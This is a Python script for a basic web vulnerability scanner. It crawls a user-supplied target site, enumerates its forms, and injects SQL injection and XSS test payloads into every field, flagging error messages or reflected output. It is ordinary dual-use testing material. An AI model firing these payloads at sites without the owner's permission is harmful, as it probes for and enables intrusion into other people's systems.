import requests
from bs4 import BeautifulSoup

# Function to crawl and find all links on a webpage
def crawl(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = set()

        # Find all anchor tags with href attributes
        for link in soup.find_all('a', href=True):
            href = link['href']
            # Filter out links and form complete URLs
            if href.startswith('http'):
                links.add(href)
            elif href.startswith('/'):
                # Combine relative URLs with the base URL
                links.add(url + href)
        
        return links
    except requests.RequestException as e:
        print(f"Error crawling {url}: {e}")
        return set()

# Function to find input fields in a given URL
def find_inputs(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        input_details = []

        for form in forms:
            form_details = {}
            action = form.get('action')
            method = form.get('method', 'get').lower()

            inputs = []
            for input_tag in form.find_all('input'):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name')
                inputs.append({'type': input_type, 'name': input_name})

            form_details['action'] = action
            form_details['method'] = method
            form_details['inputs'] = inputs
            input_details.append(form_details)

        return input_details

    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")
        return []

# Function to test for SQL Injection
def test_sql_injection(url, form_details):
    sqli_payloads = ["' OR '1'='1", "' OR 1=1 --", "' OR 'x'='x"]
    is_vulnerable = False

    for payload in sqli_payloads:
        data = {input_field['name']: payload for input_field in form_details['inputs']}
        action_url = form_details['action']

        try:
            if form_details['method'] == 'post':
                response = requests.post(action_url, data=data)
            else:
                response = requests.get(action_url, params=data)

            # Check for common SQL error patterns in the response
            errors = ["error in your SQL syntax", "unclosed quotation mark", "SQL error"]
            for error in errors:
                if error.lower() in response.text.lower():
                    print(f"[SQL Injection] Potential vulnerability detected at {action_url} with payload: {payload}")
                    is_vulnerable = True
                    break

        except requests.RequestException as e:
            print(f"Error testing SQL Injection at {action_url}: {e}")
    
    return is_vulnerable

# Function to test for XSS
def test_xss(url, form_details):
    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    is_vulnerable = False

    for payload in xss_payloads:
        data = {input_field['name']: payload for input_field in form_details['inputs']}
        action_url = form_details['action']

        try:
            if form_details['method'] == 'post':
                response = requests.post(action_url, data=data)
            else:
                response = requests.get(action_url, params=data)

            # Check if the payload is reflected in the response
            if payload in response.text:
                print(f"[XSS] Potential vulnerability detected at {action_url} with payload: {payload}")
                is_vulnerable = True

        except requests.RequestException as e:
            print(f"Error testing XSS at {action_url}: {e}")

    return is_vulnerable

# Main function
if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    crawled_links = crawl(target_url)

    print(f"Found {len(crawled_links)} links on {target_url}:")
    for link in crawled_links:
        print(link)

    # Check each crawled link for input fields
    for link in crawled_links:
        print(f"\nScanning {link} for input fields...")
        inputs = find_inputs(link)

        if inputs:
            print(f"Found {len(inputs)} forms on {link}:")
            for form in inputs:
                print(f"  Form action: {form['action']} | Method: {form['method']}")
                for input_field in form['inputs']:
                    print(f"    Input name: {input_field['name']} | Type: {input_field['type']}")

                # Test the form for vulnerabilities
                sql_injection_found = test_sql_injection(link, form)
                xss_found = test_xss(link, form)

                if not sql_injection_found and not xss_found:
                    print("No vulnerabilities found for this form.")

        else:
            print(f"No forms found on {link}.")
